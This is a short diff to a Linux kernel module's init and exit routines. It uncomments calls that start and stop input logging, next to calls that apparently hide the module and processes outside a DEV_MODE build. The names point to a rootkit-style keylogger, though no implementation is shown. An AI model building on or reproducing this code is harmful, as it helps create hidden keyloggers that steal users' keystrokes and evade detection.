@@ -22,8 +22,8 @@ static int __init main_init(void) {
 	error = outputDevice_init();
 	if (error) return error;
 
-	//error = logInput_init();
-	//if (error) return error;
+	error = logInput_init();
+	if (error) return error;
 
 #ifndef DEV_MODE
 	error = moduleHide_start();
@@ -46,7 +46,7 @@ static void __exit main_exit(void) {
 #ifndef DEV_MODE
 	moduleHide_stop();
 #endif
-	//logInput_exit();
+	logInput_exit();
 	outputDevice_exit();
 	processHider_exit();
 
